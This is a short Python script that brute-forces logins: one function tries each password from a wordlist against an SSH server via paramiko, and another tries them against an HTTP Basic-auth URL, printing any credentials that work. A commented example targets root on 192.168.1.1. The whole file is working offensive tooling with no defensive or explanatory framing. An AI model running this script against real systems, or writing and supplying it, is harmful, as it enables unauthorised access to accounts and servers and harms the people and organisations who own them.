import socket
import paramiko
import requests
from time import sleep
from urllib.parse import urljoin, urlparse

def normalize_http_target(target):
    parsed = urlparse(target)
    if not parsed.scheme:
        target = f"http://{target}"
    return target.rstrip("/")

def ssh_bruteforce(target, username, password_file):
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]
            
        for password in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target, username=username, password=password)
                print(f"[+] Success: {username}:{password}")
                ssh.close()
                return True
            except paramiko.AuthenticationException:
                pass
    except FileNotFoundError:
        print("[-] Password file not found.")
    return False

def http_bruteforce(target, username="admin", password_file="/path/to/words.txt", path="/"):
    target = normalize_http_target(target)
    url = urljoin(target + "/", path.lstrip("/"))
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]
            
        for password in passwords:
            response = requests.get(url, auth=(username, password), timeout=8)
            if response.status_code == 200:
                print(f"[+] Success: {username}:{password}")
                return True
    except FileNotFoundError:
        print("[-] Password file not found.")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

if __name__ == "__main__":
    # Example usage
    # ssh_bruteforce("192.168.1.1", "root", "passwords.txt")
    pass